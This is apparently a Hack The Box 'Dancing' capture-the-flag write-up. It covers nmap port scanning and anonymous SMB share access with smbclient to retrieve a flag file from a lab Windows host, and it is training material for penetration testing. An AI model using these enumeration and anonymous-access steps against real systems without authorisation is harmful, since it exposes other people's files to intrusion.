# Dancing
#startingpoint
#veryeasy 
#smb

Firstly, we start by opening a VPN connection and launching the VM on HTB.

### Reconnaissance
The first step in any penetration test is to gather information about the target system. In this case, we are trying to identify open ports and services on the target host with the IP address 10.129.193.6. We use the `nmap -p- -sV $TARGET` command with the `-p-` option to scan all possible TCP ports and the `-sV` option to display service version information. The output shows that there are some open ports, after performing a little of research we realize that this ports corresponds to a machine which is likely to be running a SMB service.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-16 11:31 CET
Nmap scan report for 10.129.64.157
Host is up (0.068s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
### SMB Protocol

First of all we need to see all the shares that are inside the SMB server so we run `smbclient -L $TARGET`
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
```
Now we need to test all of them one by one in order to see if there is one which allow us to enter without the need of credentials. After testing all of them we realize that the last one doesn't need credentials so we enter using the command `smbclient  //${TARGET}/WorkShares`

Once inside we check the available information, where we will find the flag that we are looking for:
```
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

		5114111 blocks of size 4096. 1732664 blocks available
smb: \> ls Amy.J\ 
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

		5114111 blocks of size 4096. 1732664 blocks available
smb: \> ls James.P\
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1732664 blocks available

```

To retrieve the flag file we run this command `smb: \> get James.P\flag.txt`

